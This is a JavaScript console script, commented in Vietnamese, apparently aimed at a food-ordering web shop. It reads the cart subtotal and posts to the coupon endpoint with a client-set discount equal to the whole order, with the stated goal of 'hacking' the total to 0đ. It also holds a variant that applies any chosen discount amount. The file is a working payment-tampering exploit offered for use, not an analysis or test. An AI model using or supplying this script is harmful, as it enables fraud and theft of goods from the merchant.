// 🎯 MINIMAL HACK - Chỉ các lệnh cần thiết, ít console log

// =====================================================
// LỆNH 1: HACK VỀ ĐÚNG 0Đ (ONE-LINER)
// =====================================================
fetch('/cart').then(r=>r.text()).then(h=>{const s=parseInt((h.match(/Subtotal[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i)||h.match(/Tạm tính[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i))[1].replace(/\./g,''));const ship=s>200000?0:25000;const d=s+ship;fetch('/coupon/apply',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':document.querySelector('meta[name="csrf-token"]').content},body:JSON.stringify({coupon_code:'FASTFOOD10',discount:d})}).then(r=>r.json()).then(res=>console.log(res.success?`✅ 0đ (${d.toLocaleString('vi-VN')}đ discount)`:`❌ ${res.message||'Failed'}`))});

// =====================================================
// LỆNH 2: CHECK KẾT QUẢ
// =====================================================
fetch('/cart').then(r=>r.text()).then(h=>{const m=h.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);console.log(m?`💵 ${parseInt(m[1].replace(/\./g,'')).toLocaleString('vi-VN')}đ`:'❌ Not found')});

// =====================================================
// LỆNH 3: TÍNH TOÁN MANUAL (nếu cần)
// =====================================================
fetch('/cart').then(r=>r.text()).then(h=>{const s=parseInt((h.match(/Subtotal[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i)||h.match(/Tạm tính[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i))[1].replace(/\./g,''));const ship=s>200000?0:25000;console.log(`${(s+ship).toLocaleString('vi-VN')}đ`)});

// =====================================================
// LỆNH 4: APPLY DISCOUNT CỤ THỂ
// =====================================================
// Thay 150000 bằng số tiền cần discount
fetch('/coupon/apply',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':document.querySelector('meta[name="csrf-token"]').content},body:JSON.stringify({coupon_code:'FASTFOOD10',discount:150000})}).then(r=>r.json()).then(d=>console.log(d.success?`✅ ${d.discount.toLocaleString('vi-VN')}đ`:`❌ ${d.message||'Failed'}`));

console.log("🎯 Minimal Hack loaded. Copy lệnh 1 để hack về 0đ"); 